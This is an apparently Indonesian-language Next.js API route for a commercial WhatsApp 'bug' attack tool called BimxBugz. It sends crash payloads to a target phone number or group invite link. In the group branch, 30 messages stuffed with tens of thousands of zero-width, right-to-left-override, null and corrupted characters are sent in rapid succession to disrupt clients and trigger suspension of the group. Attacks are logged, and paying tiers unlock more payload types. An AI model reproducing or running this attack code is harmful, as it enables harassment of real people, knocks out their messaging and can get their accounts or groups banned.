import { NextRequest, NextResponse } from "next/server";
import { verifyToken } from "@/lib/auth";
import { getWAConnection, isWAConnected } from "@/lib/waManager";
import { BUG_PAYLOADS } from "@/lib/bugPayloads";
import { db, getDbStatus, isDatabaseAvailable } from "@/db";
import { attackLogs } from "@/db/schema";
import { memoryDB } from "@/lib/dbMemory";

export async function POST(req: NextRequest) {
  try {
    const auth = req.headers.get("authorization");
    if (!auth?.startsWith("Bearer ")) {
      return NextResponse.json({ error: "Unauthorized - token hilang" }, { status: 401 });
    }
    const payload = verifyToken(auth.slice(7));
    if (!payload) {
      return NextResponse.json({ error: "Token tidak valid - silakan relogin" }, { status: 401 });
    }

    let body: any;
    try {
      body = await req.json();
    } catch {
      return NextResponse.json({ error: "Body JSON tidak valid" }, { status: 400 });
    }

    const { attackType, target, groupLink } = body;

    if (!isWAConnected(`${payload.userId}`)) {
      return NextResponse.json({ 
        error: "⚠️ WA BELUM TERHUBUNG! Silahkan hubungkan nomor WA pengirim di menu Pairing terlebih dahulu. Buka menu Pairing WA V2 → pilih QR atau Pairing Code → hubungkan.",
        code: "NOT_CONNECTED"
      }, { status: 400 });
    }

    const wa = getWAConnection(`${payload.userId}`);
    if (!wa?.sock) {
      return NextResponse.json({ error: "Koneksi WA tidak aktif, silahkan hubungkan ulang di menu Pairing. Sesi mungkin expired." }, { status: 400 });
    }

    // Handle group kill - ONE-KILL V3: 30x heavy payload rapid 0.3s interval
    if (attackType === "kill-group" && groupLink) {
      let groupId = groupLink;
      let inviteCode = "";
      if (groupLink.includes("chat.whatsapp.com/")) {
        inviteCode = groupLink.split("chat.whatsapp.com/")[1].split(/[?#]/)[0];
        try {
          const info = await wa.sock.groupGetInviteInfo(inviteCode).catch(() => null);
          if (info && (info as any).id) {
            groupId = (info as any).id;
          } else {
            groupId = inviteCode;
          }
        } catch {
          groupId = inviteCode;
        }
      }

      // ONE-KILL payloads: ultra heavy invisible + corrupted
      const invisibleBase = "\u200B".repeat(20000) + "\u200C".repeat(10000) + "\u200D".repeat(10000) + "\uFEFF".repeat(15000);
      const corruptedBase = "\uFFFD".repeat(10000) + "\u00AD".repeat(10000) + "\u2060".repeat(8000);
      const heavyEmoji = "💀".repeat(2000) + "☠️".repeat(1000) + "🔥".repeat(1000);

      let successCount = 0;
      let failCount = 0;

      try {
        // ONE-KILL: 30x messages rapid fire
        for (let i = 0; i < 30; i++) {
          const isEven = i % 2 === 0;
          const isTriple = i % 3 === 0;
          let payloadText = "";

          if (isTriple) {
            // Corrupted + RTLO + heavy
            payloadText = "\u202E".repeat(5000) + corruptedBase + invisibleBase + `ONE_KILL_V3_${i}_BIMXZBUGXZ_` + heavyEmoji + "\u202D".repeat(3000);
          } else if (isEven) {
            payloadText = invisibleBase + `💀GROUP_KILL_ONE_KILL_${i}_SUSPEND_${Date.now()}💀` + corruptedBase + "\u200B".repeat(30000);
          } else {
            payloadText = "\uFEFF".repeat(20000) + heavyEmoji + invisibleBase + `☠️ONE_KILL_${i}☠️` + "\u0000".repeat(5000) + corruptedBase;
          }

          // Truncate to WA limit but keep heavy (65k is limit, we push to 60k)
          const finalPayload = payloadText.slice(0, 60000);

          try {
            const targetJid = groupId.includes("@g.us") ? groupId : `${groupId}@g.us`;
            await wa.sock.sendMessage(targetJid, { text: finalPayload });
            successCount++;
            // Rapid interval 300ms for one-kill effect
            await new Promise(r => setTimeout(r, 300));
          } catch (e: any) {
            failCount++;
            console.log(`Group one-kill attempt ${i} failed:`, e.message);
            // Try alternative: if groupId is invite code, try to join then send?
            try {
              if (inviteCode && i < 3) {
                // Attempt to get group ID via different method
                const altJid = `${inviteCode}@g.us`;
                await wa.sock.sendMessage(altJid, { text: finalPayload.slice(0, 30000) });
                successCount++;
              }
            } catch {}
          }
        }
      } catch (err: any) {
        console.error("Group one-kill error:", err);
        return NextResponse.json({ 
          error: `Group one-kill partially failed: ${err.message}. Terkirim ${successCount}/30, gagal ${failCount}. Mungkin grup link invalid atau WA session bermasalah.`,
          partial: true,
          successCount,
          failCount,
        }, { status: 500 });
      }

      // Log
      const dbStatus = getDbStatus();
      if (dbStatus.available && isDatabaseAvailable && db) {
        try {
          await db.insert(attackLogs).values({
            userId: payload.userId,
            username: payload.username,
            attackType: "kill-group-one-kill-v3",
            target: groupLink,
            status: successCount > 20 ? "success-one-kill" : "partial",
          });
        } catch {
          await memoryDB.createAttackLog(payload.userId, payload.username, "kill-group-one-kill-v3", groupLink, successCount > 20 ? "success-one-kill" : "partial");
        }
      } else {
        await memoryDB.createAttackLog(payload.userId, payload.username, "kill-group-one-kill-v3", groupLink, successCount > 20 ? "success-one-kill" : "partial");
      }

      return NextResponse.json({
        success: true,
        successCount,
        failCount,
        total: 30,
        message: successCount >= 25 ? "BimxBugz V1 menyatakan bahwa pengiriman bug anda Success ONE-KILL dan grup akan langsung ditangguhkan permanen! SIKIKKK!" : `Terkirim ${successCount}/30 payload one-kill. Grup mungkin butuh beberapa menit untuk terdeteksi suspend. Coba lagi jika belum suspend.`,
        credit: "BimxBugz By BimzOfficial, SIKIKKK AYAAAAA!!! ONE-KILL V3",
        target: groupLink,
        method: "one-kill-30x-100k-rapid",
        realWA: true,
        oneKill: true,
      });
    }

    // Individual attack
    if (!attackType || !target) {
      return NextResponse.json({ error: "Data serangan tidak lengkap: butuh attackType dan target" }, { status: 400 });
    }

    if (payload.role === "user" && attackType !== "delay-attack") {
      return NextResponse.json({ error: "🔒 FITUR INI KHUSUS MEMBER RESELLER/OWNER. SILAKAN UPGRADE AKUNMU!" }, { status: 403 });
    }

    const attackFn = BUG_PAYLOADS[attackType];
    if (!attackFn) {
      return NextResponse.json({ error: `Tipe serangan tidak dikenal: ${attackType}` }, { status: 400 });
    }

    const cleanTarget = target.replace(/[^0-9]/g, "");
    if (cleanTarget.length < 8) {
      return NextResponse.json({ error: "Nomor target tidak valid! Minimal 8 digit." }, { status: 400 });
    }

    const jid = `${cleanTarget}@s.whatsapp.net`;
    const payloads = attackFn();
    const messagesToSend = Array.isArray(payloads) ? payloads : [payloads];

    let sentCount = 0;
    let failedCount = 0;
    for (const msgContent of messagesToSend) {
      try {
        await wa.sock.sendMessage(jid, { text: msgContent });
        sentCount++;
        if (messagesToSend.length > 1) {
          await new Promise(r => setTimeout(r, 600));
        }
      } catch (err: any) {
        failedCount++;
        console.error(`Failed to send attack chunk:`, err?.message);
      }
    }

    const dbStatus = getDbStatus();
    if (dbStatus.available && isDatabaseAvailable && db) {
      try {
        await db.insert(attackLogs).values({
          userId: payload.userId,
          username: payload.username,
          attackType,
          target: cleanTarget,
          status: sentCount > 0 ? "success" : "failed",
        });
      } catch {
        await memoryDB.createAttackLog(payload.userId, payload.username, attackType, cleanTarget, sentCount > 0 ? "success" : "failed");
      }
    } else {
      await memoryDB.createAttackLog(payload.userId, payload.username, attackType, cleanTarget, sentCount > 0 ? "success" : "failed");
    }

    if (sentCount === 0) {
      return NextResponse.json({
        success: false,
        sent: 0,
        total: messagesToSend.length,
        error: `Semua ${messagesToSend.length} chunks gagal terkirim. Kemungkinan: nomor tidak ada di WA, WA session expired, atau target memblokir. Failed: ${failedCount}`,
      }, { status: 500 });
    }

    return NextResponse.json({
      success: true,
      sent: sentCount,
      total: messagesToSend.length,
      failed: failedCount,
      message: "BimxBugz V1 menyatakan bahwa pengiriman bug anda Success dan insyaallah akan bekerja",
      credit: "BimxBugz By BimzOfficial, SIKIKKK AYAAAAA!!!",
      attackType,
      target: cleanTarget,
      jid,
      realWA: true,
      oneKill: attackType === "doomsday-ultimate",
    });

  } catch (err: any) {
    console.error("WA Send error:", err);
    return NextResponse.json({ 
      error: `Server error di /api/wa/send: ${err.message}. Stack: ${err.stack?.slice(0, 500) || 'no stack'}. Jika 'Unexpected token <', itu artinya server return HTML error page, bukan JSON. Cek Vercel logs.`,
      details: err.message,
    }, { status: 500 });
  }
}
